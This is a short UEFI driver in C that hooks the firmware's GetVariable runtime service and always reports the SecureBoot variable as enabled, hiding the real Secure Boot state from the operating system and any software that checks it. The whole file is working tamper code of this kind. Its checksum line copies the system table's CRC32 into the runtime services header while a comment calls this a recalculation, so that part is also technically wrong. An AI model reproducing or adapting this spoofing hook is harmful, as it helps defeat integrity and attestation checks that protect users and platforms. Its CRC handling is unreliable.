#include <Uefi.h>
#include <Library/UefiBootServicesTableLib.h>
#include <Library/UefiRuntimeServicesTableLib.h>
#include <Library/DebugLib.h>
#include <Library/BaseMemoryLib.h>

EFI_GET_VARIABLE OriginalGetVariable = NULL;

EFI_STATUS EFIAPI HookedGetVariable(
    IN CHAR16* VariableName,
    IN EFI_GUID* VendorGuid,
    OUT UINT32* Attributes OPTIONAL,
    IN OUT UINTN* DataSize,
    OUT VOID* Data
)
{
    if (VariableName != NULL && StrCmp(VariableName, L"SecureBoot") == 0) {
        if (*DataSize >= sizeof(UINT8)) {
            *((UINT8*)Data) = 1; 
            if (Attributes != NULL) {
                *Attributes = EFI_VARIABLE_BOOTSERVICE_ACCESS | EFI_VARIABLE_RUNTIME_ACCESS | EFI_VARIABLE_NON_VOLATILE;
            }
            *DataSize = sizeof(UINT8);
            return EFI_SUCCESS;
        }
        else {
            *DataSize = sizeof(UINT8);
            return EFI_BUFFER_TOO_SMALL;
        }
    }

    return OriginalGetVariable(VariableName, VendorGuid, Attributes, DataSize, Data);
}

EFI_STATUS EFIAPI UefiMain(IN EFI_HANDLE ImageHandle, IN EFI_SYSTEM_TABLE* SystemTable)
{
    EFI_STATUS Status;

    OriginalGetVariable = gRT->GetVariable;

    gRT->Hdr.CRC32 = 0;
    gRT->GetVariable = HookedGetVariable;
    gRT->Hdr.CRC32 = gST->Hdr.CRC32; // Recalculate the CRC32 checksum

    return EFI_SUCCESS;
}

EFI_STATUS
EFIAPI
InitializeSecureBootHook(
    IN EFI_HANDLE ImageHandle,
    IN EFI_SYSTEM_TABLE* SystemTable
)
{
    return UefiMain(ImageHandle, SystemTable);
}
